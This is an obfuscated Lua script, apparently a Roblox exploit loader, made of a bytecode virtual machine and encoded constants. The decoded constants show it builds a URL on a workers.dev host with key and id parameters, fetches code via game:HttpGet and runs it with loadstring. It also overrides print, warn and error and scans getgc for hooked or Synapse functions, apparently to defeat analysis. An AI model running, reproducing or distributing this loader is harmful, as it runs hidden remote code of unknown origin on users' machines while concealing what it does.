--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v81=0;local v82;while true do if (v81==0) then v82=v2(v0(v30,16));if v19 then local v95=v5(v82,v19);v19=nil;return v95;else return v82;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v83=(v31/(2^(v32-1)))%((5 -3)^(((v33-(2 -1)) -(v32-(1 + 0))) + (1 -0))) ;return v83-(v83%(2 -1)) ;else local v84=619 -((1432 -(282 + 595)) + 64) ;local v85;while true do if (v84==(931 -(857 + (1711 -(1523 + 114))))) then v85=(570 -(330 + 37 + 201))^(v32-1) ;return (((v31%(v85 + v85))>=v85) and (928 -((304 -90) + 713))) or (0 + 0) ;end end end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + 2 );v18=v18 + (1067 -(68 + 997)) ;return (v36 * (1526 -(226 + 1044))) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + 3 );v18=v18 + (17 -13) ;return (v40 * 16777216) + (v39 * (65653 -(32 + 85))) + (v38 * (251 + 5)) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=1 + 0 ;local v44=(v20(v42,958 -(383 + 509 + 65) ,47 -(1513 -(998 + 488)) ) * (2^(58 -26))) + v41 ;local v45=v20(v42,13 + 8 ,56 -25 );local v46=((v20(v42,382 -(87 + 263) )==(2 -1)) and  -(181 -(22 + 45 + 113))) or (1 + 0) ;if (v45==(0 -0)) then if (v44==(0 + 0 + 0)) then return v46 * (0 -0) ;else v45=(773 -(201 + 571)) + 0 ;v43=952 -(802 + 150) ;end elseif (v45==(5511 -3464)) then return ((v44==((1399 -608) -(368 + (861 -(145 + 293))))) and (v46 * ((3 -2)/(18 -((440 -(44 + 386)) + 8))))) or (v46 * NaN) ;end return v8(v46,v45-(3934 -2911) ) * (v43 + (v44/((3 -1)^(38 + 14)))) ;end local function v25(v47) local v48;if  not v47 then v47=v23();if (v47==(0 -0)) then return "";end end v48=v3(v16,v18,(v18 + v47) -(1139 -(116 + 1022)) );v18=v18 + v47 ;local v49={};for v64=3 -2 , #v48 do v49[v64]=v2(v1(v3(v48,v64,v64)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return 0;end)();local v51=(function() return;end)();local v52=(function() return;end)();local v53=(function() return;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();while true do local v66=(function() return 0 + 0 ;end)();while true do if (v66~=(575 -(507 + 67))) then else if ((1749 -(1013 + 736))==v50) then v51=(function() return function(v99,v100,v101) local v102=(function() return 0;end)();local v103=(function() return;end)();while true do if (v102==(1024 -(706 + 318))) then v103=(function() return 0 + 0 ;end)();while true do if (v103~=(0 -0)) then else local v117=(function() return 0;end)();local v118=(function() return;end)();while true do if (v117==0) then v118=(function() return 0;end)();while true do if (v118==(1271 -(945 + 326))) then local v343=(function() return 0 -0 ;end)();while true do if (0~=v343) then else v99[v100-#"{" ]=(function() return v101();end)();return v99,v100,v101;end end end end break;end end end end break;end end end;end)();v52=(function() return {};end)();v53=(function() return {};end)();v54=(function() return {};end)();v50=(function() return 3 -2 ;end)();end break;end if (v66~=(867 -(550 + 317))) then else if (v50~=1) then else local v93=(function() return 0 -0 ;end)();while true do if (v93==(1 -0)) then v57=(function() return {};end)();for v109= #"~",v56 do local v110=(function() return 1500 -(1408 + 92) ;end)();local v111=(function() return;end)();local v112=(function() return;end)();local v113=(function() return;end)();while true do if (v110~=(1086 -(461 + 625))) then else local v116=(function() return 0 -0 ;end)();while true do if (v116~=(285 -(134 + 151))) then else v111=(function() return 1288 -(993 + 295) ;end)();v112=(function() return nil;end)();v116=(function() return 1 + 0 ;end)();end if ((1172 -(418 + 753))~=v116) then else v110=(function() return 1666 -(970 + 695) ;end)();break;end end end if (v110==(1 -0)) then v113=(function() return nil;end)();while true do if (v111==(1990 -(582 + 1408))) then local v252=(function() return 0 -0 ;end)();while true do if (v252==(0 -0)) then v112=(function() return v21();end)();v113=(function() return nil;end)();v252=(function() return 3 -2 ;end)();end if (v252~=(1 + 0)) then else v111=(function() return 1;end)();break;end end end if ((1825 -(1195 + 629))~=v111) then else if (v112== #",") then v113=(function() return v21()~=0 ;end)();elseif (v112==(2 -0)) then v113=(function() return v24();end)();elseif (v112== #"-19") then v113=(function() return v25();end)();end v57[v109]=(function() return v113;end)();break;end end break;end end end v93=(function() return 2;end)();end if (v93==(241 -(187 + 54))) then v55=(function() return {v52,v53,nil,v54};end)();v56=(function() return v23();end)();v93=(function() return 1 + 0 ;end)();end if ((2 + 0)~=v93) then else v50=(function() return 3 -1 ;end)();break;end end end if (v50~=(2 -0)) then else v55[ #"91("]=(function() return v21();end)();for v96= #"!",v23() do local v97=(function() return v21();end)();if (v20(v97, #"[", #"\\")~=(1145 -(466 + 679))) then else local v104=(function() return 0 -0 ;end)();local v105=(function() return;end)();local v106=(function() return;end)();local v107=(function() return;end)();local v108=(function() return;end)();while true do if (v104~=(2 -1)) then else local v114=(function() return 0;end)();while true do if (v114==(1 + 0)) then v104=(function() return 1902 -(106 + 1794) ;end)();break;end if (v114~=(1636 -(1373 + 263))) then else v107=(function() return nil;end)();v108=(function() return nil;end)();v114=(function() return 1;end)();end end end if (v104==(1000 -(451 + 549))) then local v115=(function() return 0;end)();while true do if (v115~=1) then else v104=(function() return 1 + 0 ;end)();break;end if (v115==(0 -0)) then v105=(function() return 0 -0 ;end)();v106=(function() return nil;end)();v115=(function() return 115 -(4 + 110) ;end)();end end end if ((1 + 1)~=v104) then else while true do if (v105~= #"xxx") then else if (v20(v107, #"-19", #"xnx")== #"\\") then v108[ #".dev"]=(function() return v57[v108[ #"?id="]];end)();end v52[v96]=(function() return v108;end)();break;end if (v105~=(584 -(57 + 527))) then else local v227=(function() return 0 -0 ;end)();local v228=(function() return;end)();while true do if (v227~=(0 -0)) then else v228=(function() return 103 -(17 + 86) ;end)();while true do if (v228==0) then v106=(function() return v20(v97,2, #"asd");end)();v107=(function() return v20(v97, #"0313",5 + 1 );end)();v228=(function() return 1385 -(746 + 638) ;end)();end if (v228~=1) then else v105=(function() return  #"~";end)();break;end end break;end end end if (v105~=2) then else local v229=(function() return 0 + 0 ;end)();local v230=(function() return;end)();while true do if (v229==(0 -0)) then v230=(function() return 0;end)();while true do if (v230~=(2 -1)) then else v105=(function() return  #"91(";end)();break;end if (0==v230) then if (v20(v107, #".", #"~")~= #"!") then else v108[168 -(122 + 44) ]=(function() return v57[v108[343 -(218 + 123) ]];end)();end if (v20(v107,2 -0 ,2)~= #">") then else v108[ #"-19"]=(function() return v57[v108[ #"asd"]];end)();end v230=(function() return 1582 -(1535 + 46) ;end)();end end break;end end end if (v105== #",") then local v231=(function() return 0;end)();local v232=(function() return;end)();while true do if ((0 + 0)==v231) then v232=(function() return 0;end)();while true do if (v232==(0 + 0)) then v108=(function() return {v22(),v22(),nil,nil};end)();if (v106==(0 + 0)) then local v362=(function() return 0 -0 ;end)();local v363=(function() return;end)();while true do if (v362~=(1467 -(899 + 568))) then else v363=(function() return 0;end)();while true do if (v363==(0 + 0)) then v108[ #"xnx"]=(function() return v22();end)();v108[ #"0313"]=(function() return v22();end)();break;end end break;end end elseif (v106== #"}") then v108[ #"19("]=(function() return v23();end)();elseif (v106==(3 -1)) then v108[ #"-19"]=(function() return v23() -((4 -2)^(619 -(268 + 335))) ;end)();elseif (v106== #"xxx") then local v373=(function() return 0 + 0 ;end)();local v374=(function() return;end)();while true do if (v373==(290 -(60 + 230))) then v374=(function() return 0;end)();while true do if (v374==(0 -0)) then v108[ #"xnx"]=(function() return v23() -(2^(588 -(426 + 146))) ;end)();v108[ #"0836"]=(function() return v22();end)();break;end end break;end end end v232=(function() return 1213 -(323 + 889) ;end)();end if (1==v232) then v105=(function() return 1 + 1 ;end)();break;end end break;end end end end break;end end end end for v98= #"]",v23() do v53,v98,v28=(function() return v51(v53,v98,v28);end)();end return v55;end v66=(function() return 1457 -(282 + 1174) ;end)();end end end end local function v29(v58,v59,v60) local v61=v58[1];local v62=v58[582 -((2133 -(1733 + 39)) + (601 -382)) ];local v63=v58[323 -(53 + 267) ];return function(...) local v67=v61;local v68=v62;local v69=v63;local v70=v27;local v71=(1035 -(125 + 909)) + 0 ;local v72= -1;local v73={};local v74={...};local v75=v12("#",...) -1 ;local v76={};local v77={};for v86=0,v75 do if ((1851>=378) and (v86>=v69)) then v73[v86-v69 ]=v74[v86 + (983 -(18 + (1376 -412))) ];else v77[v86]=v74[v86 + (3 -2) ];end end local v78=(v75-v69) + 1 + 0 + 0 ;local v79;local v80;while true do v79=v67[v71];v80=v79[1];if ((2893>=2383) and (v80<=(21 + 12))) then if (v80<=(528 -(409 + 103))) then if ((1108<1653) and (v80<=(857 -(20 + 830)))) then if ((2909>2609) and (v80<=(3 + (236 -(46 + 190))))) then if ((v80<=(127 -(116 + 10))) or (1948>=3476)) then if (v80>(0 + (95 -(51 + 44)))) then v77[v79[740 -(542 + 196) ]]=v79[6 -3 ];else local v121=0 + 0 ;local v122;while true do if (v121==(0 + 0)) then v122=v79[1 + 1 ];v77[v122](v77[v122 + (2 -1) ]);break;end end end elseif ((4794>=833) and (v80==(4 -(1 + 1)))) then local v123=v79[(2870 -(1114 + 203)) -(1126 + 425) ];local v124={v77[v123](v13(v77,v123 + (406 -(118 + 287)) ,v79[11 -8 ]))};local v125=0;for v233=v123,v79[1125 -(118 + 1003) ] do v125=v125 + (2 -1) ;v77[v233]=v124[v125];end elseif ((4090==4090) and (757>194) and (v77[v79[379 -(142 + 235) ]]==v79[4])) then v71=v71 + 1 ;else v71=v79[13 -10 ];end elseif ((v80<=(2 + 3)) or (3758==2498)) then if ((v80==4) or (31>=1398)) then local v126=v79[979 -(553 + 424) ];v77[v126]=v77[v126](v13(v77,v126 + (1 -0) ,v79[3 + 0 ]));else local v128=0 + 0 + 0 ;local v129;local v130;local v131;while true do if ((3196<=4872) and (v128==(1 + (663 -(174 + 489))))) then v131={};v130=v10({},{__index=function(v304,v305) local v306=0 + 0 ;local v307;while true do if (v306==(0 + 0)) then v307=v131[v305];return v307[2 -1 ][v307[5 -3 ]];end end end,__newindex=function(v308,v309,v310) local v311=v131[v309];v311[2 -1 ][v311[1 + 1 ]]=v310;end});v128=9 -7 ;end if ((755 -(239 + 514))==v128) then for v313=1 + 0 ,v79[1333 -((2702 -(830 + 1075)) + 532) ] do v71=v71 + (525 -(303 + 221)) + 0 ;local v314=v67[v71];if ((3326==3326) and (v314[1 + 0 ]==(20 -11))) then v131[v313-(1203 -(373 + 829)) ]={v77,v314[2 + 1 ]};else v131[v313-(1 -0) ]={v59,v314[1 + 2 ]};end v76[ #v76 + (1 -(1162 -(171 + 991))) ]=v131;end v77[v79[338 -(144 + 192) ]]=v29(v129,v130,v60);break;end if (v128==(216 -(42 + 174))) then v129=v68[v79[3 + 0 ]];v130=nil;v128=1;end end end elseif ((v80==(5 + 1)) or (2673<1575)) then local v132=v79[1 + 1 ];v77[v132](v13(v77,v132 + ((6202 -4697) -(363 + 1141)) ,v79[1583 -(1183 + 397) ]));else local v133=v79[5 -3 ];local v134=v79[4];local v135=v133 + 2 + 0 ;local v136={v77[v133](v77[v133 + (1976 -(1913 + 62)) ],v77[v135])};for v236=1 + 0 ,v134 do v77[v135 + v236 ]=v136[v236];end local v137=v136[1];if v137 then v77[v135]=v137;v71=v79[(17 -10) -4 ];else v71=v71 + (1934 -(565 + 1368)) ;end end elseif (v80<=(41 -30)) then if (v80<=(1670 -(1477 + 184))) then if (v80>(10 -2)) then v77[v79[2 + 0 ]]=v77[v79[859 -(564 + 292) ]];else v77[v79[2 -0 ]][v79[8 -(5 + 0) ]]=v79[4];end elseif ((1433<=3878) and (v80==(314 -(244 + 60)))) then local v142=0 + 0 ;local v143;local v144;local v145;while true do if ((v142==0) or (1583==1735)) then v143=v79[2];v144=v77[v143];v142=(1671 -1194) -(41 + 435) ;end if (v142==((2890 -1888) -((1511 -573) + 63))) then v145=v77[v143 + 2 + 0 ];if (v145>(1125 -(936 + 189))) then if ((v144>v77[v143 + 1 + 0 ]) or (2981==2350)) then v71=v79[1616 -(1565 + 48) ];else v77[v143 + 2 + (3 -2) ]=v144;end elseif ((v144<v77[v143 + (1139 -(782 + 356)) ]) or (3721<=1455)) then v71=v79[(1518 -(111 + 1137)) -(176 + 91) ];else v77[v143 + 3 ]=v144;end break;end end elseif v77[v79[2]] then v71=v71 + (2 -(159 -(91 + 67))) ;else v71=v79[4 -1 ];end elseif (v80<=(1105 -(975 + (348 -231)))) then if (v80>(3 + 9)) then if (v79[1877 -(157 + 1718) ]==v77[v79[4 + 0 ]]) then v71=v71 + (3 -2) ;else v71=v79[10 -7 ];end else v77[v79[1020 -(697 + 321) ]]();end elseif (v80<=(37 -23)) then local v146=v79[(526 -(423 + 100)) -(1 + 0) ];v77[v146](v13(v77,v146 + (2 -1) ,v79[7 -4 ]));elseif (v80>(6 + 9)) then if  not v77[v79[3 -1 ]] then v71=v71 + (2 -1) ;else v71=v79[1230 -(322 + 905) ];end else local v259=v79[613 -(602 + 9) ];local v260,v261=v70(v77[v259]());v72=(v261 + v259) -(1190 -(449 + 740)) ;local v262=0;for v293=v259,v72 do v262=v262 + (873 -(826 + 24 + 22)) ;v77[v293]=v260[v262];end end elseif (v80<=(971 -((1016 -(326 + 445)) + 702))) then if ((934<2270) and (v80<=(63 -43))) then if ((v80<=(6 + 12)) or (4466<=493) or (1612==1255)) then if (v80>17) then local v147=1898 -(260 + 1638) ;local v148;local v149;local v150;while true do if ((v147==1) or (2547<=1987)) then v150=440 -(382 + (253 -195)) ;for v317=v148,v79[4] do v150=v150 + (3 -2) ;v77[v317]=v149[v150];end break;end if (((0 -0) + 0)==v147) then v148=v79[2];v149={v77[v148](v13(v77,v148 + (2 -1) ,v72))};v147=1206 -(902 + 303) ;end end else local v151=v79[(6 -3) -1 ];local v152=v77[v151];local v153=v77[v151 + 2 ];if ((v153>0) or (4352<4206)) then if ((v152>v77[v151 + (2 -1) ]) or (2860<=181)) then v71=v79[1 + 2 ];else v77[v151 + (1693 -(1121 + 569)) ]=v152;end elseif ((3222>=1527) and (v152<v77[v151 + (215 -(22 + 192)) ])) then v71=v79[3];else v77[v151 + 3 ]=v152;end end elseif ((2961>2740) and (v80>(702 -(483 + (911 -(530 + 181)))))) then v77[v79[1465 -(1404 + (940 -(614 + 267))) ]]=v77[v79[8 -5 ]][v79[4 -0 ]];else local v156=v79[767 -(468 + 297) ];local v157=v77[v156 + (564 -(334 + (260 -(19 + 13)))) ];local v158=v77[v156] + v157 ;v77[v156]=v158;if (v157>(0 -0)) then if (v158<=v77[v156 + (2 -(1 -0)) ]) then local v324=0 -0 ;while true do if (v324==(0 + 0)) then v71=v79[239 -((328 -187) + 95) ];v77[v156 + (8 -5) + 0 ]=v158;break;end end end elseif ((1505<=2121) and (v158>=v77[v156 + (2 -1) ])) then local v325=0;while true do if ((3696>=3612) and (v325==(0 -0))) then v71=v79[1 + 2 ];v77[v156 + 3 ]=v158;break;end end end end elseif ((744==744) and (v80<=(60 -38))) then if ((v80>(15 + 6)) or (2970==1878)) then local v160=0 + 0 ;local v161;local v162;local v163;while true do if ((v160==(0 -0)) or (1979>=2836)) then v161=v79[2 + 0 ];v162={v77[v161](v13(v77,v161 + 1 + 0 ,v72))};v160=1 -0 ;end if (v160==(766 -(574 + 191))) then v163=0 + 0 + 0 ;for v326=v161,v79[9 -(8 -3) ] do v163=v163 + 1 ;v77[v326]=v162[v163];end break;end end else v60[v79[6 -3 ]]=v77[v79[2 + 0 ]];end elseif (v80>(872 -(254 + (2407 -(1293 + 519))))) then v71=v79[(262 -133) -(55 + 71) ];else v77[v79[2]]=v59[v79[3]];end elseif (v80<=((93 -57) -8)) then if ((1833<=2668) and ((v80<=26) or (3693<1977))) then if ((v80==25) or (930>2101)) then local v169=1790 -((1095 -522) + 1217) ;local v170;while true do if ((3686==3686) and (v169==0)) then v170=v79[5 -(12 -9) ];v77[v170]=v77[v170]();break;end end else do return;end end elseif (v80==((6 -3) + 24)) then if ((3467>477) and (v77[v79[2 -0 ]]~=v79[943 -(714 + 225) ])) then v71=v71 + (2 -1) ;else v71=v79[3 -0 ];end elseif (v79[1 + 1 ]==v77[v79[4]]) then v71=v71 + (1 -0) ;else v71=v79[809 -(118 + 688) ];end elseif ((4153>3086) and (v80<=(78 -(25 + 23)))) then if ((v80>(6 + 23)) or (3288>=3541)) then v77[v79[(1000 + 888) -(190 + 737 + 959) ]]=v77[v79[3]][v79[13 -9 ]];else local v173=v79[734 -(16 + 716) ];local v174=v79[7 -3 ];local v175=v173 + (99 -(11 + 86)) ;local v176={v77[v173](v77[v173 + (286 -(175 + 110)) ],v77[v175])};for v239=2 -1 ,v174 do v77[v175 + v239 ]=v176[v239];end local v177=v176[4 -(1 + 2) ];if (v177 or (4654<=4050) or (3557==4540)) then v77[v175]=v177;v71=v79[1799 -(168 + 335 + 1293) ];else v71=v71 + (2 -1) ;end end elseif ((v80<=(15 + 8 + 8)) or (2602<1496)) then v77[v79[2]]=v59[v79[1064 -(810 + 251) ]];elseif (v80==(23 + 9)) then v77[v79[2]]=v29(v68[v79[1 + 2 ]],nil,v60);else v77[v79[2 + 0 ]][v79[536 -(43 + 490) ]]=v77[v79[737 -(711 + 22) ]];end elseif (v80<=((1289 -(709 + 387)) -143)) then if (v80<=41) then if (v80<=(896 -(240 + 619))) then if (v80<=35) then if ((v80==34) or (261>1267)) then local v180=v79[1 + 1 ];v77[v180]=v77[v180]();else v77[v79[2 -0 ]]=v29(v68[v79[1 + 2 ]],nil,v60);end elseif ((1272<3858) and ((v80==36) or (1020>2288))) then local v183=0;local v184;local v185;local v186;while true do if (v183==(1745 -(1344 + 400))) then v186={};v185=v10({},{__index=function(v329,v330) local v331=v186[v330];return v331[406 -(255 + 150) ][v331[2 + 0 ]];end,__newindex=function(v332,v333,v334) local v335=0 + 0 ;local v336;while true do if (v335==0) then v336=v186[v333];v336[4 -3 ][v336[6 -4 ]]=v334;break;end end end});v183=1741 -((2262 -(673 + 1185)) + 1335) ;end if (v183==(406 -(183 + 223))) then v184=v68[v79[3 -0 ]];v185=nil;v183=1 + (0 -0) ;end if ((328==328) and (v183==(1 + 1))) then for v337=1,v79[341 -(10 + 327) ] do v71=v71 + 1 + (0 -0) ;local v338=v67[v71];if (v338[339 -(118 + 220) ]==(3 + 6)) then v186[v337-(450 -(108 + 341)) ]={v77,v338[1496 -(711 + 782) ]};else v186[v337-(1 + 0) ]={v59,v338[1 + 2 ]};end v76[ #v76 + (1820 -(580 + 1239)) ]=v186;end v77[v79[5 -3 ]]=v29(v184,v185,v60);break;end end else do return;end end elseif (v80<=(38 + 1)) then if ((3664==3664) and (v80==(2 + 36))) then v77[v79[2]]=v60[v79[3]];else v77[v79[1 + 0 + (1 -0) ]]=v79[7 -4 ];end elseif ((1511<3808) and (v80>(25 + 15))) then local v191=v79[1169 -(645 + 522) ];local v192,v193=v70(v77[v191]());v72=(v193 + v191) -(1791 -(1010 + 780)) ;local v194=0 + 0 ;for v242=v191,v72 do v194=v194 + (4 -(1 + 2)) ;v77[v242]=v192[v194];end else for v245=v79[5 -3 ],v79[1839 -(1045 + 791) ] do v77[v245]=nil;end end elseif ((1941>=450) and (v80<=(113 -68))) then if (v80<=(85 -42)) then if (v80==(63 -21)) then v77[v79[507 -(351 + 154) ]]();elseif v77[v79[2]] then v71=v71 + (1575 -(1281 + 293)) ;else v71=v79[269 -(28 + 238) ];end elseif ((v80>((192 -94) -(1934 -(446 + 1434)))) or (4646<324)) then v77[v79[(2844 -(1040 + 243)) -(1381 + 178) ]][v79[3 + 0 ]]=v79[4 + 0 ];else local v197=v79[1 + 1 ];local v198={v77[v197](v13(v77,v197 + 1 + 0 ,v79[473 -(381 + 89) ]))};local v199=0 + 0 ;for v247=v197,v79[3 + 1 ] do v199=v199 + (2 -1) ;v77[v247]=v198[v199];end end elseif ((3833==3833) and ((v80<=47) or (2510>4919))) then if (v80==(78 -32)) then if ((v77[v79[1158 -(1074 + 82) ]]==v79[8 -4 ]) or (1240>3370)) then v71=v71 + 1 ;else v71=v79[1787 -(214 + 1570) ];end else v77[v79[1457 -(990 + 465) ]]={};end elseif ((v80<=48) or (2481==4682)) then if (v79[2]==v79[(1849 -(559 + 1288)) + 2 ]) then v71=v71 + 1 ;else v71=v79[3];end elseif ((4727>=208) and (v80==((1953 -(609 + 1322)) + (481 -(13 + 441))))) then v77[v79[2 + 0 ]]=v77[v79[(41 -30) -8 ]][v77[v79[4]]];else v77[v79[1728 -(1668 + 58) ]]=v60[v79[629 -((1341 -829) + 114) ]];end elseif (v80<=58) then if ((280<3851) and (v80<=(140 -86))) then if (v80<=52) then if (((4763==4763) and (v80==51)) or (3007>3194)) then local v201=v79[3 -1 ];v77[v201]=v77[v201](v77[v201 + (3 -2) ]);elseif ((4137>1848) and (v77[v79[1 + (4 -3) ]]~=v79[1 + 3 ])) then v71=v71 + 1 ;else v71=v79[3 + 0 ];end elseif (v80==53) then local v203=0 -0 ;local v204;while true do if (((2436<=3134) and (v203==(1994 -(109 + 1885)))) or (2136>=2946)) then v204=v79[1471 -(1269 + 200) ];v77[v204]=v77[v204](v77[v204 + (1 -0) ]);break;end end else local v205=v79[2];v77[v205](v77[v205 + (816 -(4 + 94 + 717)) ]);end elseif ((3723==3723) and (v80<=((3203 -2321) -(802 + 24)))) then if ((2165<=2521) and (v80==55)) then v77[v79[2]]=v77[v79[5 -2 ]][v77[v79[4 -0 ]]];else v77[v79[2]]={};end elseif ((v80==(21 + 36)) or (4046>=4316)) then for v250=v79[2],v79[1 + 2 ] do v77[v250]=nil;end else v60[v79[3 + 0 + 0 ]]=v77[v79[1 + 1 ]];end elseif ((v80<=(183 -121)) or (2008<1929)) then if (v80<=(13 + 47)) then if (v80==(164 -105)) then v71=v79[9 -6 ];else local v212=v79[1 + 1 ];local v213=v77[v79[3]];v77[v212 + 1 + 0 ]=v213;v77[v212]=v213[v79[4 + 0 ]];end elseif (v80>(45 + 16)) then if ((2861>661) and (2384>1775) and  not v77[v79[1 + 1 ]]) then v71=v71 + (1434 -(797 + 636)) ;else v71=v79[14 -11 ];end else v77[v79[2]]=v77[v79[1622 -(781 + 646 + 192) ]];end elseif (v80<=64) then if (v80==(22 + 41)) then local v219=v79[(7 -3) -2 ];v77[v219]=v77[v219](v13(v77,v219 + 1 + 0 + 0 + 0 ,v79[3]));else local v221=v79[2];local v222=v77[v79[3]];v77[v221 + 1 ]=v222;v77[v221]=v222[v79[2 + 2 ]];end elseif ((4525>4519) and (v80<=65)) then if ((3178>972) and ((v79[328 -(192 + 134) ]==v79[1280 -(316 + 960) ]) or (4543<=4376))) then v71=v71 + 1 + 0 ;else v71=v79[3];end elseif (v80>(51 + 15)) then v77[v79[2 + 0 ]][v79[3]]=v77[v79[15 -11 ]];else local v282=551 -(83 + 468) ;local v283;local v284;local v285;while true do if ((728==728) and (v282==(2 + 0))) then if (v284>(1806 -(1202 + 604))) then if ((4766==4766) and (v285<=v77[v283 + (4 -(3 + 0)) ])) then local v364=0 -0 ;while true do if (v364==(0 -0)) then v71=v79[(321 + 7) -(45 + 280) ];v77[v283 + 3 + 0 ]=v285;break;end end end elseif (v285>=v77[v283 + 1 ]) then v71=v79[(436 -(153 + 280)) + 0 ];v77[v283 + 2 + 1 ]=v285;end break;end if ((v282==(1 + 0)) or (1076>4671)) then v285=v77[v283] + v284 ;v77[v283]=v285;v282=2;end if ((v282==0) or (2745>3128)) then v283=v79[1 + 1 ];v284=v77[v283 + (3 -(2 -1)) ];v282=1912 -(340 + 1571) ;end end end v71=v71 + 1 + 0 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!163Q00028Q0003023Q005F4703013Q0076026Q00084003023Q00733303053Q007461626C6503063Q00636F6E636174034Q00026Q00F03F00027Q0040030A3Q006C6F6164737472696E6703043Q00247B667D03013Q004603053Q00737061776E03063Q00737472696E6703063Q00666F726D6174034D3Q00682Q7470733A2Q2F736D612Q6C2D756E696F6E2D643736652E6272756E6F746F6C65646F3532362E776F726B6572732E6465762Q2F3F6B65793D25732669643D25732676683D257326663D2573030B3Q006F6E6563726561746F727803043Q00247B697D03043Q0067616D6503073Q00482Q747047657400423Q0012013Q00014Q0039000100033Q0026033Q00160001000100043B3Q00160001001226000400023Q00201E00040004000300060B0004000D00013Q00043B3Q000D0001001226000400023Q00201E00040004000300201E00040004000400261B0004000E0001000500043B3Q000E00012Q00253Q00013Q001226000400063Q00201E000400040007001226000500023Q00201E000500050003001201000600084Q00040004000600022Q003D000100043Q0012013Q00093Q0026033Q001B0001000400043B3Q001B0001001226000400023Q00302D00040003000A00043B3Q004100010026033Q00270001000B00043B3Q002700010012260004000C4Q003D000500034Q00330004000200022Q000C000400010001002E30000D00050001000E00043B3Q002600010012260004000F3Q00022300058Q0004000200010012013Q00043Q0026033Q00020001000900043B3Q00020001001201000400013Q0026030004002E0001000900043B3Q002E00010012013Q000B3Q00043B3Q000200010026030004002A0001000100043B3Q002A0001001226000500103Q00201E000500050011001201000600123Q001201000700133Q001201000800144Q003D000900013Q001201000A000D4Q00040005000A00022Q003D000200053Q001226000500153Q00203C0005000500162Q003D000700024Q00040005000700022Q003D000300053Q001201000400093Q00043B3Q002A000100043B3Q000200012Q00253Q00013Q00013Q00133Q00028Q00026Q00F03F030A3Q002Q5F6E616D6563612Q6C030C3Q007365746D6574617461626C6503043Q0067616D6503053Q007072696E7403043Q007761726E03053Q00652Q726F7203073Q0067657466656E76027Q0040026Q00084003053Q00706169727303053Q00676574676303043Q007479706503083Q0066756E6374696F6E030A3Q0069736C636C6F7375726503133Q0069735F73796E617073655F66756E6374696F6E03043Q0077616974030C3Q006765746D6574617461626C6500493Q0012013Q00014Q0039000100023Q0026033Q001C0001000200043B3Q001C000100060B0001000F00013Q00043B3Q000F000100201E00030001000300060B0003000F00013Q00043B3Q000F0001001226000300043Q001226000400054Q003800053Q000100201E0006000100030010210005000300062Q0006000300050001001226000300094Q002200030001000200201E000300030006001226000400094Q002200040001000200201E000400040007001226000500094Q002200050001000200201E000500050008001215000500083Q001215000400073Q001215000300063Q0012013Q000A3Q0026033Q00380001000B00043B3Q003800010012260003000C3Q0012260004000D4Q000F000400014Q001200033Q000500043B3Q003500010012260008000E4Q003D000900074Q0033000800020002002603000800350001000F00043B3Q00350001001226000800104Q003D000900074Q003300080002000200060B0008003500013Q00043B3Q00350001001226000800114Q003D000900074Q0033000800020002000610000800350001000100043B3Q003500012Q003D000800024Q003D000900076Q000800020001000607000300230001000200043B3Q0023000100043B3Q00480001000E1C0001004200013Q00043B3Q00420001001226000300123Q001201000400026Q000300020001001226000300133Q001226000400054Q00330003000200022Q003D000100033Q0012013Q00023Q0026033Q00020001000A00043B3Q000200012Q0039000200023Q00022300025Q0012013Q000B3Q00043B3Q000200012Q00253Q00013Q00013Q00013Q0003053Q007063612Q6C01053Q001226000100013Q00062400023Q000100012Q00099Q000001000200012Q00253Q00013Q00013Q000B3Q00026Q00F03F03053Q00646562756703073Q00676574696E666F03043Q006E757073028Q00030A3Q00676574757076616C756503053Q007072696E7403043Q007761726E03053Q00652Q726F72030A3Q00736574757076616C756503073Q0067657466656E76002F3Q0012013Q00013Q001226000100023Q00201E0001000100032Q001700026Q003300010002000200201E000100010004001201000200013Q00040A3Q002E0001001201000400054Q0039000500073Q0026030004000F0001000500043B3Q000F0001001201000500054Q0039000600063Q001201000400013Q0026030004000A0001000100043B3Q000A00012Q0039000700073Q002603000500120001000500043B3Q00120001001226000800023Q00201E0008000800062Q001700096Q003D000A00034Q00020008000A00092Q003D000700094Q003D000600083Q00261B000600210001000700043B3Q0021000100261B000600210001000800043B3Q002100010026030006002D0001000900043B3Q002D0001001226000800023Q00201E00080008000A2Q001700096Q003D000A00033Q001226000B000B4Q0022000B000100022Q0031000B000B00062Q00060008000B000100043B3Q002D000100043B3Q0012000100043B3Q002D000100043B3Q000A00010004423Q000800012Q00253Q00017Q00",v9(),...);
